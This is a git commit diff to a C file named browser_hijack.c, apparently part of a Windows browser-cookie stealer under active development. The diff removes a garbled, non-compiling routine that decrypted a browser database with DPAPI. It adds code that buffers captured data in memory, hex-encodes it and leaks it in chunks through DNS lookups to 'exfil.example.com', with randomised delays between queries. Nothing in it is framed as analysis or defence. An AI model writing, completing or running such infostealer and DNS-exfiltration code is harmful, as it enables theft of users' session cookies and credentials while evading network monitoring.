185200f82ed54a50fbba923e5cbce62856452f45
will-the-creator <hoopa05.cascade@icloud.com>
2025-07-21 15:52:38 -0600

    update dns exfil

--- browser_hijack.c
+++ browser_hijack.c
@@ -1,36 +1,57 @@
 #include <windows.h>
 #include <shlobj.h>
-#include <sqlite3.h>
 #include <stdio.h>
 #include <string.h>
+#include <windns.h>
+#include <wincrypt.h>
 
-int decrypt_db(const BYTE *encrypt_db, DWORD encrypted_len, BYTE **decrypted_data, DWORD *decrypted_len) {
-	DATA_DUMP in = { (DWORD)encrypted_len, (BYTE*)encrypt_db};
-	DATA_DUMP out;
+#pragma comment(lib, "dnsapi.lib")
+#pragma comment(lib, "crypt32.lib")
 
-	if (CryptUNprotectData(&in, 0, 0, 0, 0, 0, &out)) {
-		*decrypt_db = out.pbData;
-		*decrypted_len = out.cbData;
-		return 1; // it worked
-	}
-	return 0; // :(
-}
-//
-char logBuffer[4096]; //stores cookies
+// Memory logging buffer
+char logBuffer[4096];
 int logIndex = 0;
 
+// Log to memory
 void mem_log(const char *data) {
-	inf tel = strlen(data);
-	if (logIndex + len < sizeof(logBuffer)) {
-		memcpy(&logBuffer[logIndex], data, len);
-		logIndex += len;
-	}
+    size_t len = strlen(data);
+    if (logIndex + len < sizeof(logBuffer)) {
+        memcpy(&logBuffer[logIndex], data, len);
+        logIndex += len;
+    }
 }
-void hex_enc(const unsigned char *in, size_t len, char *out) {
-	const char *hex = "0123456789abcdef";
-	for (size_t i = 0; i < len; i++) {
-		out[i * 2] = hex[in[i] >> 4];
-		out[i * 2 + 1] = hex[in[i] & 0xF];
-	}
-	out[len * 2] = '\0'
+
+// Hex encoder
+void hex_encode(const unsigned char *in, size_t len, char *out) {
+    const char *hex = "0123456789abcdef";
+    for (size_t i = 0; i < len; i++) {
+        out[i * 2] = hex[in[i] >> 4];
+        out[i * 2 + 1] = hex[in[i] & 0xF];
+    }
+    out[len * 2] = '\0';
+}
+
+// DNS exfil
+void dns_exfil(const char *hexdata, const char *domain) {
+    char fullQuery[256];
+    static int counter = 0;
+
+    snprintf(fullQuery, sizeof(fullQuery), "%02x.%s.%s", counter++, hexdata, domain);
+
+    DNS_RECORD *record;
+    DnsQuery_A(fullQuery, DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &record, NULL);
+    if (record) DnsRecordListFree(record, DnsFreeRecordList);
+}
+
+// Send memory contents over DNS
+void actual_exfil() {
+    char hex[128]; // 60 bytes -> 120 hex chars + null
+    size_t chunk_size = 60;
+
+    for (size_t i = 0; i < logIndex; i += chunk_size) {
+        size_t len = (i + chunk_size < logIndex) ? chunk_size : (logIndex - i);
+        hex_encode((unsigned char*)&logBuffer[i], len, hex);
+        dns_exfil(hex, "exfil.example.com");
+        Sleep(100 + (rand() % 30));
+    }
 }
